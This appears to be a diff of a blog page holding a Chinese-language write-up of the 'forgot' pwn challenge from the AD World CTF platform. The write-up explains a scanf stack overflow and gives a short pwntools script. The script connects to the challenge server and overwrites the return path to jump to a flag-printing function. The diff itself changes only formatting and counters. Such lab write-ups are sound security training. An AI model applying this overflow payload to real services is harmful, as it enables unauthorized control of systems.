@@ -282,11 +282,10 @@
       
         <p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/0.png" class></strong></p>
  <a id="more"></a>
-
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/6.png" class></strong></p>
 <h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/1.png" class></strong></p>
 <h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/2.png" class></strong></p>
-<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
+<p><strong>__isoc99_scanf()</strong>函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
 <h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/3.png" class></strong></p>
 <p>找到其调用函数的位置</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/4.png" class></strong></p>
@@ -303,7 +302,6 @@
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/10.png" class></strong></p>
 <p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
 <h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/11.png" class></strong></p>
 
     </div>
@@ -408,14 +406,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/xiaohong404.github.io/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/xiaohong404.github.io/Categories/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -459,7 +457,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020-11-10</span>
+  <span itemprop="copyrightYear">2020-11-11</span>
   <span class="with-love",id="animate">
     <i class="fa fa-basketball-ball"></i>
   </span>
